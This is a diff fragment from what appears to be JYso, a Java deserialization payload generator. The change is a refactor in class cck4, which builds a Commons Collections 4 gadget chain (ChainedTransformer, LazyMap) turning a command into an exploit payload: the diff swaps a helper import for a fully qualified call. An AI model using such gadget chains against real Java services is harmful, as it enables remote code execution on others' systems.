@@ -3,7 +3,7 @@ package com.qi4l.JYso.gadgets;
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Reflections;
-import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
+
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
@@ -20,7 +20,7 @@ public class cck4 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
         Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
-        Transformer[] transformers = (Transformer[]) TransformerUtil.makeTransformer(command);
+        Transformer[] transformers = (Transformer[]) com.qi4l.JYso.gadgets.utils.Utils.makeTransformer(command);
         Transformer transformerChain = new ChainedTransformer(fakeTransformers);
         Map innerMap = new HashMap();
         Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);
